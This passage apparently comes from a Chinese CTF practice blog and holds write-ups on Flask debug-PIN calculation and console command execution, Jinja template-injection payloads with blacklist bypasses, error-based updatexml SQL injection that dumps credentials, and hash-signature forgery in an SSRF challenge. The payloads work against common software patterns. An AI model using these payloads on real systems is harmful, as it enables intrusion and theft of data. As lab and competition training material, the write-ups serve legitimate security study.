<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span>,<span class="hljs-comment">#服务器运行flask所登录的用户名</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment">#modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment">#getattr(app, &quot;\_\_name__&quot;, app.\_\_class__.\_\_name__)</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>,<span class="hljs-comment">#flask库下app.py的绝对路径</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485377862363&#x27;</span>,<span class="hljs-comment">#当前网络的mac地址的十进制数</span><br>    <span class="hljs-string">&#x27;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38&#x27;</span><span class="hljs-comment">#机器的id</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> isinstance(bit, str):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> len(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br>print(rv)<br></code></pre></td></tr></table></figure>

<p>记住要在脚本开头加上utf-8句子，不然会报错# encoding: utf-8</p>
<p><img src="/2021/09/01/2021/buu/17/image-20211028184228753.png" alt="image-20211028184228753"></p>
<p><strong>PIN:    562-831-713</strong></p>
<p>在报错页面选择进入命令行，输入pin</p>
<p><img src="/2021/09/01/2021/buu/17/image-20211028184419952.png" alt="image-20211028184419952"></p>
<p>进入之后在输入以下指令：</p>
<p>os.popen() 方法用于从一个命令打开一个管道。</p>
<p>语法格式：</p>
<p>os.popen(command[, mode[, bufsize]])</p>
<p><img src="/2021/09/01/2021/buu/17/image-20211028185034014.png" alt="image-20211028185034014"></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span><br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&quot;ls -l /&quot;</span>).<span class="hljs-built_in">read</span>()<br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&quot;cat /this_is_the_flag.txt&quot;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/01/2021/buu/17/image-20211028184721243.png" alt="image-20211028184721243"></p>
<h4 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h4><p>字符串拼接绕过<br>从 black list大致知道了关键字，另外会将字符转小写，所以没法通过lower方法或者base64、hex一下绕过，但是最常见的是字符串拼接绕过，参考菜鸟教程找到os模块的一些方法<br>先使用listdir方法看看当前目录文件</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><code class="hljs markdown">&#123;% for c in [<span class="hljs-string"></span>].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;__imp&#x27;+&#x27;ort__&#x27;</span>](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></code></pre></td></tr></table></figure>

<p>加密解密结果</p>
<p>结果 ： [&#39;bin&#39;, &#39;boot&#39;, &#39;dev&#39;, &#39;etc&#39;, &#39;home&#39;, &#39;lib&#39;, &#39;lib64&#39;, &#39;media&#39;, &#39;mnt&#39;, &#39;opt&#39;, &#39;proc&#39;, &#39;root&#39;, &#39;run&#39;, &#39;sbin&#39;, &#39;srv&#39;, &#39;sys&#39;, &#39;tmp&#39;, &#39;usr&#39;, &#39;var&#39;, &#39;this_is_the_flag.txt&#39;, &#39;.dockerenv&#39;, &#39;app&#39;]</p>
<p>其中this_is_the_flag.txt有flag字样，那么接下来就是想办法读这个文件，还是采用拼接字符串的方式，然后结合内建函数open，菜鸟教程</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;</span>,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019 HardSQL</title>
    <url>/2021/08/30/2021/buu/16/</url>
    <content><![CDATA[<h4 id="0x00知识点："><a href="#0x00知识点：" class="headerlink" title="0x00知识点："></a>0x00知识点：</h4><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>sql注入中的updatexml()函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">UPDATEXML(XML_document, XPath_string, new_value);<br></code></pre></td></tr></table></figure>

<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>
<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
<p>作用：改变文档中符合条件的节点的值</p>
<p>改变XML_document中符合XPATH_string的值</p>
<p>例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p>​            其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">ERROR </span>1105 (HY000): XPATH syntax error: &#x27;:root@localhost&#x27;<br></code></pre></td></tr></table></figure>

<p>xpath语法总结：<a href="https://www.jb51.net/article/125607.htm">https://www.jb51.net/article/125607.htm</a></p>
<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">ExtractValue(xml_frag, xpath_expr)<br></code></pre></td></tr></table></figure>

<p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p>
<p>第一个参数可以传入目标xml文档</p>
<p>第二个参数是用Xpath路径法表示的查找路径</p>
<p>例子：</p>
<p>例如：SELECT ExtractValue(‘<a><b><b></b></b></a>‘, ‘/a/b’); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/4267332-e7ea259697eb4cf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/421/format/webp" alt="img"></p>
<p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/4267332-f13351339e441a96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/580/format/webp" alt="img"></p>
<h4 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h4><p><img src="/2021/08/30/2021/buu/16/image-20210830091906610.png" alt="image-20210830091906610"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>&#x27;or(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure>

<p>爆出库</p>
<p><img src="/2021/08/30/2021/buu/16/image-20210830092011080.png" alt="image-20210830092011080"></p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">table_name</span>)from(<span class="hljs-name">information_schema</span>.tables)where(<span class="hljs-name">table_schema</span>)like(&#x27;geek&#x27;)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/30/2021/buu/16/image-20210830092201589.png" alt="image-20210830092201589"></p>
<p>爆出表名</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">column_name</span>))from(<span class="hljs-name">information_schema</span>.columns)where(<span class="hljs-name">table_name</span>)like(&#x27;H4rDsq1&#x27;)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/30/2021/buu/16/image-20210830092501514.png" alt="image-20210830092501514"></p>
<p>爆出列名</p>
<p>构造payload：</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">id</span>,&#x27;~&#x27;,username,&#x27;~&#x27;,password))from(<span class="hljs-name">H4rDsq1</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/30/2021/buu/16/image-20210830092549838.png" alt="image-20210830092549838"></p>
<p>右边的flag</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">right</span>(<span class="hljs-name">password</span>,<span class="hljs-number">35</span>))from(<span class="hljs-name">H4rDsq1</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/30/2021/buu/16/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210830092639064.png" alt="image-20210830092639064"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">补充：<br><br><span class="hljs-number">1</span>：空格被过滤可以使用<span class="hljs-comment">/**/</span>或者()绕过<br><span class="hljs-number">2</span>：=号被过滤可以用like来绕过<br><span class="hljs-number">3</span>：substring与mid被过滤可以用right与left来绕过<br></code></pre></td></tr></table></figure>



<h4 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h4><p>[<a href="https://blog.csdn.net/qq_51652864/article/details/115740086">极客大挑战 2019]HardSQL_o3Ev的博客-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF 2019 SSRF Me</title>
    <url>/2021/08/18/2021/buu/13/</url>
    <content><![CDATA[<p>[TOC]</p>
<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机开启</p>
<p><img src="/2021/08/18/2021/buu/13/image-20210818200351121.png" alt="image-20210818200351121"></p>
<p>明显的python代码段，复制下来并进行整理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><br><span class="hljs-comment">#encoding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br><br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):</span>		<span class="hljs-comment">#是一个简单的赋值函数</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):		<span class="hljs-comment">#如果没有该文件夹，则创立一个文件夹</span><br>            os.mkdir(self.sandbox)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span>(<span class="hljs-params">self</span>):</span><br>    result = &#123;&#125;<br>    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>    <span class="hljs-keyword">if</span> (self.checkSign()):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>            tmpfile = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)   <span class="hljs-comment">#注意w，可以对result.txt文件进行修改</span><br>            resp = scan(self.param)<br>            <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">print</span> resp<br>                tmpfile.write(resp)	<span class="hljs-comment">#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span><br>                tmpfile.close()<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>            f = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)	<span class="hljs-comment">#打开方式为只读</span><br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()	<span class="hljs-comment">#读取result.txt中的数据</span><br>        <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>            result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>    <span class="hljs-keyword">return</span> result<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-meta">        @app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])		#注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))		<span class="hljs-comment">#cookie传递action参数，对应不同的处理方式</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))		<span class="hljs-comment">#传递get方式的参数param</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))			<span class="hljs-comment">#cookie传递sign参数sign</span><br>    ip = request.remote_addr				<span class="hljs-comment">#获取请求端的ip地址</span><br>    <span class="hljs-keyword">if</span>(waf(param)):			<span class="hljs-comment">#调用waf函数进行过滤</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip) 			<span class="hljs-comment">#创建Task类对象</span><br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())			<span class="hljs-comment">#以json的形式返回到客户端</span><br><br><span class="hljs-meta">@app.route(&#x27;/&#x27;)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> open(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">param</span>):</span><br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]		<span class="hljs-comment">#这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span>(<span class="hljs-params">action, param</span>):</span>				<span class="hljs-comment">#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">content</span>):</span>			<span class="hljs-comment">#将传入的字符串进行md5加密</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">param</span>):</span>						<span class="hljs-comment">#防火墙的作用是判断开头的几个字母是否是gopher 或者是file  如果是的话，返回true</span><br>    check=param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">9999</span>)<br></code></pre></td></tr></table></figure>

<p>代码审计：</p>
<h5 id="1-flask框架"><a href="#1-flask框架" class="headerlink" title="1.flask框架"></a>1.flask框架</h5><h5 id="2-De1ta和-geneSign"><a href="#2-De1ta和-geneSign" class="headerlink" title="2./De1ta和/geneSign"></a>2./De1ta和/geneSign</h5><h5 id="3-task类"><a href="#3-task类" class="headerlink" title="3.task类"></a>3.task类</h5><p>得到flag的大致思路有了：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">首先绕过<span class="hljs-selector-tag">self</span><span class="hljs-selector-class">.checkSign</span>()，并且传入的<span class="hljs-selector-tag">action</span>需要同时包含<span class="hljs-selector-tag">scan</span>和<span class="hljs-selector-tag">read</span>，然后<span class="hljs-selector-tag">if</span> &quot;<span class="hljs-selector-tag">scan</span>&quot; <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">self</span><span class="hljs-selector-class">.action</span>:执行将<span class="hljs-selector-tag">flag</span><span class="hljs-selector-class">.txt</span>中的数据写入<span class="hljs-selector-tag">result</span><span class="hljs-selector-class">.txt</span>中，继续<span class="hljs-selector-tag">if</span> &quot;<span class="hljs-selector-tag">read</span>&quot; <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">self</span><span class="hljs-selector-class">.action</span>:执行读取<span class="hljs-selector-tag">result</span><span class="hljs-selector-class">.txt</span>中的数据，并且放在 <span class="hljs-selector-tag">result</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;data&#x27;</span>]</span> 中 ， <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">json</span><span class="hljs-selector-class">.dumps</span>(<span class="hljs-selector-tag">task</span><span class="hljs-selector-class">.Exec</span>())   接着返回以<span class="hljs-selector-tag">json</span>的形式返回到客户端。<br></code></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby">@app.route(<span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br> <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span><br>        <span class="hljs-keyword">if</span> (getSign(<span class="hljs-keyword">self</span>.action, <span class="hljs-keyword">self</span>.param) == <span class="hljs-keyword">self</span>.sign)<span class="hljs-symbol">:</span><br>            <span class="hljs-keyword">return</span> True<br>        <span class="hljs-symbol">else:</span><br>            <span class="hljs-keyword">return</span> False<br><br> <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span><span class="hljs-params">(action, param)</span></span>:				<span class="hljs-comment">#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure>

<p>需要满足函数</p>
<p>self.checkSign()</p>
<p>则需满足</p>
<p><strong>getSign(self.action, self.param) == self.sign，（而sign值通过cookie传值</strong>）</p>
<p>也就需要</p>
<p><strong>hashlib.md5(secert_key + param + action).hexdigest() == self.sign</strong></p>
<p>=&gt;<strong>hashlib.md5(secert_key + ‘flag.txt’ + ‘readscan’).hexdigest() == self.sign</strong></p>
<p>我们需要得到**secert_key + ‘flag.txtreadscan’**的哈希值</p>
<p>我们还不懂secret_key的值是多少，它只存在于服务端，但是我们可以通过上面截取的源码中/geneSign，来返回我们所需要的编码之后的哈希值</p>
<p>注意到/geneSign中已经将action定为scan，所以我们传入的param可以为flag.txtread，这样的话还是会拼接为secert_key + ‘flag.txtreadscan’</p>
<h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">/geneSign?<span class="hljs-attribute">param</span>=flag.txtread<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/18/2021/buu/13/image-20210818205021931.png" alt="image-20210818205021931"></p>
<p>得到哈希值后，将flag.txt中的数据读入result.txt，然后读取result.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>              tmpfile = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)   <span class="hljs-comment">#注意w，可以对result.txt文件进行修改</span><br>              resp = scan(self.param)<br>              <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                  result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>              <span class="hljs-keyword">else</span>:<br>                  <span class="hljs-keyword">print</span> resp<br>                  tmpfile.write(resp)	<span class="hljs-comment">#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span><br>                  tmpfile.close()<br>              result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>              f = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)	<span class="hljs-comment">#打开方式为只读</span><br>              result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()	<span class="hljs-comment">#读取result.txt中的数据</span><br>          <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br></code></pre></td></tr></table></figure>

<h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h5><p>伪造cookie的值</p>
<p><img src="/2021/08/18/2021/buu/13/image-20210818205732109.png" alt="image-20210818205732109"></p>
<h5 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h5><p><a href="https://blog.csdn.net/RABCDXB/article/details/115412359">https://blog.csdn.net/RABCDXB/article/details/115412359</a></p>
<p><a href="https://www.cnblogs.com/zzjdbk/p/13685940.html">https://www.cnblogs.com/zzjdbk/p/13685940.html</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF 2018 WarmUp</title>
    <url>/2021/08/29/2021/buu/15/</url>
    <content><![CDATA[<p> 重新回顾了下这题</p>
<p><img src="/2021/08/29/2021/buu/15/image-20210829094805908.png" alt="image-20210829094805908"></p>
<p>F12查看到源码</p>
